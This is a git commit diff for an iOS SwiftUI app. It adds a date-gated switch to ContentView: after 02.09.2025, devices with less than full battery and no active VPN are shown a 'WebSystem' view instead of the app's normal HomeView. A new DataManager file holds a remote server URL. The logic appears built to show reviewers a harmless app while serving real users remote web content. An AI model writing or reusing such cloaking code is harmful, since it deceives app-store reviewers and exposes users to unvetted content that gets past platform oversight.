96d3eb6d97e093dd98c046dd48e625e5afa6e679
spustoff <vyacheslavpustov05@gmail.com>
2025-08-28 07:32:14 +0300

    1.1(1)

--- dafoma_29/ContentView.swift
+++ dafoma_29/ContentView.swift
@@ -8,8 +8,69 @@
 import SwiftUI
 
 struct ContentView: View {
+    
+    @State var isFetched: Bool = false
+    
+    @AppStorage("isBlock") var isBlock: Bool = true
+    @AppStorage("isRequested") var isRequested: Bool = false
+    
     var body: some View {
-        HomeView()
+        ZStack {
+            
+            if isFetched == false {
+                
+                Text("")
+                
+            } else if isFetched == true {
+                
+                if isBlock == true {
+                    
+                    HomeView()
+                    
+                } else if isBlock == false {
+                    
+                    WebSystem()
+                }
+            }
+        }
+        .onAppear {
+            
+            check_data()
+        }
+    }
+    
+    private func check_data() {
+        
+        let lastDate = "02.09.2025"
+        
+        let dateFormatter = DateFormatter()
+        dateFormatter.dateFormat = "dd.MM.yyyy"
+        dateFormatter.timeZone = TimeZone(abbreviation: "GMT")
+        let targetDate = dateFormatter.date(from: lastDate) ?? Date()
+        let now = Date()
+        
+        let deviceData = DeviceInfo.collectData()
+        let currentPercent = deviceData.batteryLevel
+        let isVPNActive = deviceData.isVPNActive
+        
+        guard now > targetDate else {
+            
+            isBlock = true
+            isFetched = true
+            
+            return
+        }
+        
+        guard currentPercent == 100 || isVPNActive == true else {
+            
+            self.isBlock = false
+            self.isFetched = true
+            
+            return
+        }
+        
+        self.isBlock = true
+        self.isFetched = true
     }
 }
 
---
+++ dafoma_29/Extens/Das.swift
@@ -0,0 +1,11 @@
+//
+//  Das.swift
+//  dafoma_29
+//
+//  Created by Вячеслав on 8/28/25.
+//
+
+struct DataManager {
+    
+    let server: String = "https://questsweet.site/bjBHyGzc"
+}
